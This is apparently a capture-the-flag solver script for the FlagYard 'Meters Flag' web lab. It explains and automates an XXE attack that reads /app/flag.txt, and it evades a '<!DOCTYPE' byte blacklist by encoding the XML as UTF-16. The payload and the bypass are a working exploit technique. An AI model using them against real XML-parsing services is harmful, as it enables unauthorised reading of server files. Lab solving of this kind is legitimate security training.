#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
METERS FLAG  -  FlagYard Web solver

Meters Flag (FlagYard Training Labs, Easy / SAFCSP) - "Unleash your web
hacking skills to unearth the secret flag hidden at '/app/flag.txt'".

The app is a BMI Calculator (Flask + lxml). POST / accepts raw XML:

    parser = etree.XMLParser(resolve_entities=True)
    weight = doc.xpath('//weight/text()')[0]
    ...

and echoes weight/height back into the XML response. resolve_entities=True
makes it vulnerable to XXE, but a blacklist drops any raw-body request that
contains b"<!DOCTYPE" or b"+ADwAIQ-ENTITY" (encoded <!ENTITY).

Bypass: send the whole XML in UTF-16 (BOM + NUL interspersed bytes). lxml
auto-detects the encoding and resolves the entity, while the raw byte filter
never sees the literal bytes <!DOCTYPE.

Attack chain:

    1) build <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
       with &xxe; inside <weight>
    2) encode the payload to UTF-16 -> blacklist bypass
    3) POST / -> the response XML echoes <weight> = file contents = flag

Verified live: the tool recovered the flag via UTF-16 XXE
(`FlagY{...}`) and saves it to `flag_from_meters.txt`.
"""
from __future__ import annotations

import http.client
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("M E T E R S   F L A G   S O L V E R",
              "UTF-16 XXE -> file:///app/flag.txt -> flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Meters Flag challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    if url.startswith("//"):
        url = url[2:]
    m = re.match(r"^(.*?)(:\d+)?$", url)
    host = m.group(1)
    port = int(m.group(2).lstrip(":")) if m.group(2) else 80
    return host, port

def read_flag(raw):
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

def main():
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host, port = parse_host(url)
    step("target host %s:%d" % (host, port))

    xml = ("<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
           "<!DOCTYPE foo [\n"
           "  <!ENTITY xxe SYSTEM \"file:///app/flag.txt\">\n"
           "]>\n"
           "<root><weight>&xxe;</weight><height>100</height></root>")
    body = xml.encode("utf-16")  # BOM + NUL bytes -> blacklist bypass

    step("POST / with UTF-16 XXE payload (file:///app/flag.txt)")
    c = http.client.HTTPConnection(host, port, timeout=30)
    c.request("POST", "/", body=body,
              headers={"Content-Type": "application/xml",
                       "User-Agent": "Mozilla/5.0"})
    r = c.getresponse()
    data = r.read()
    c.close()

    try:
        text = data.decode("utf-16", "replace") if data[:2] in (b"\xff\xfe", b"\xfe\xff") \
            else data.decode("utf-8", "replace")
    except Exception:
        text = data.decode("utf-8", "replace")

    flag = read_flag(text)
    if not flag:
        fail("response did not contain a flag: %s" % text[:200])
        return

    tick(0.85, "flag.txt entity resolved and echoed")
    print()
    ok("FLAG = %s" % flag)

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_meters.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()